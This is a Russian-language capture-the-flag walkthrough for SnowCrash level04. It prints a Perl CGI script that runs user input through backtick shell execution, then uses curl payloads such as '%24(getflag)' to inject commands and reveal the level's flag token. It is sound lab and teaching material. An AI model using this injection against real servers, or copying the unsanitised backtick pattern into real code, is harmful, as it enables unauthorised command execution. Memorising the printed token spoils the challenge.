у нас есть файл level04.pl

включает он в себя отправку запроса на сервер
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
level04@SnowCrash:~$ ./level04.pl 
Content-type: text/html

пробуем что нибудь запросить через curl
level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=whoami"
whoami

выводит whoami потому что в таком формате запрос инициализирует команду echo

level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=$(whoami)"
level04

В случае $(...), оболочка пытается выполнить команду локально, а в случае %24(...) символ $ передается как текст в URL, который будет обработан сервером.

level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=%24(whoami)"
flag04

получаем выполненную команду


проверяем что у нас есть


level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=$(getflag)"
curl: (3) Illegal characters found in URL

натыкаемся на ошибку

level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=%24(getflag)"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

